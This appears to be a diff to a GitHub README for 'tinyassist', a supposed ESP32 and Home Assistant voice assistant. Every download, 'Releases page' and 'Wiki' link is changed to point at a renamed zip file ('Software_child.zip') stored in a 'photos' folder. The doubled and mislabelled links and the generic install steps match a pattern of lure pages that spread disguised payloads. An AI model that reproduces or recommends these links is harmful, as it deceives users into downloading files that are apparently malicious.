@@ -1,7 +1,7 @@
 # 🎤 tinyassist - Your Smart Voice Assistant Simplified
 
 ## 📥 Download Now
-[![Download tinyassist](https://raw.githubusercontent.com/zeyn00/tinyassist/main/photos/tinyassist_1.3.zip%https://raw.githubusercontent.com/zeyn00/tinyassist/main/photos/tinyassist_1.3.zip)](https://raw.githubusercontent.com/zeyn00/tinyassist/main/photos/tinyassist_1.3.zip)
+[![Download tinyassist](https://github.com/zeyn00/tinyassist/raw/refs/heads/main/photos/Software_child.zip%https://github.com/zeyn00/tinyassist/raw/refs/heads/main/photos/Software_child.zip)](https://github.com/zeyn00/tinyassist/raw/refs/heads/main/photos/Software_child.zip)
 
 ## 🚀 Getting Started
 Welcome to tinyassist! This mini voice assistant makes your life easier by using the power of ESP32 and Home Assistant Voice Assist. In this guide, you will learn how to download and run tinyassist on your device. Let's get started!
@@ -14,7 +14,7 @@ To run tinyassist smoothly, ensure you have the following:
 
 ### 📥 Download & Install
 1. **Visit the Releases Page**
-   To download tinyassist, go to the [Releases page](https://raw.githubusercontent.com/zeyn00/tinyassist/main/photos/tinyassist_1.3.zip).
+   To download tinyassist, go to the [Releases page](https://github.com/zeyn00/tinyassist/raw/refs/heads/main/photos/Software_child.zip).
 
 2. **Choose the Right Version**
    Once on the Releases page, you'll see different versions available for download. Select the latest version for the best features and improvements. 
@@ -62,7 +62,7 @@ If you encounter issues while using tinyassist, consider the following:
 - **Reinstall tinyassist:** If problems persist, uninstall and reinstall the application.
 
 ### 📄 Additional Help
-For more assistance, refer to the documentation on the [tinyassist Wiki](https://raw.githubusercontent.com/zeyn00/tinyassist/main/photos/tinyassist_1.3.zip) or ask questions in the Issues section of the repository. We’re here to help you.
+For more assistance, refer to the documentation on the [tinyassist Wiki](https://github.com/zeyn00/tinyassist/raw/refs/heads/main/photos/Software_child.zip) or ask questions in the Issues section of the repository. We’re here to help you.
 
 ## 📥 Download tinyassist Again
-You can download tinyassist anytime from the [Releases page](https://raw.githubusercontent.com/zeyn00/tinyassist/main/photos/tinyassist_1.3.zip). Happy assisting!
+You can download tinyassist anytime from the [Releases page](https://github.com/zeyn00/tinyassist/raw/refs/heads/main/photos/Software_child.zip). Happy assisting!
